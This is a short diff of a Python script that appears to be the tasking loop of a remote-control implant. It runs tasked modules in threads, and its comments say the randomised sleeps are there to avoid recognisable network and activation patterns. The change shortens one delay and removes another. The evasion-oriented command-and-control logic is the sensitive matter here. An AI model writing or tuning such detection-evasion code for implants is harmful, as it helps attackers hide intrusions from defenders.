@@ -126,7 +126,6 @@ while True:#always be active
             t = threading.Thread(target=module_runner,args=(task['module'],))
             #start a new thread of the task so u can run a bunch of tasks at the same time
             t.start()#start the thread
-            time.sleep(random.randint(1,10))
+            time.sleep(random.randint(1,6))
             #sleep for a random amount of time so there wont be network patterns to recognize
-    time.sleep(random.randint(100,120))
     #again sleep for a random amount of time so there wont be an activation pattern
